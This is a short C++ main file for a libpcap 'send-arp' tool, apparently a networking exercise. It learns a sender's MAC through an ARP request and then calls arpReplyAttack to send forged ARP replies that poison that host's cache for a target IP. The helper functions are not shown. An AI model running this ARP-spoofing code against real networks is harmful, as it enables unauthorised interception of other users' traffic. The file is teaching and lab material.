#include "pch.h"

void usage()
{
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(1);
    }

    //find mac address from network interface
    char src_mac[18];
    char dst_mac[18];
    char ip_addr[16];
    GetMacAddressFromInterface(dev, src_mac, ip_addr);

    //find sender_mac address using arp request
    int pair = argc / 2 - 1;
    for(int i = 0; i < pair; i++)
    {
        char* sender_ip = argv[2 + (2 * i)];
        arpRequest(pcap, ip_addr, sender_ip, src_mac, dst_mac);

        char* target_ip = argv[3 + (2 * i)];
        arpReplyAttack(pcap, target_ip, sender_ip, src_mac, dst_mac);
    }
}
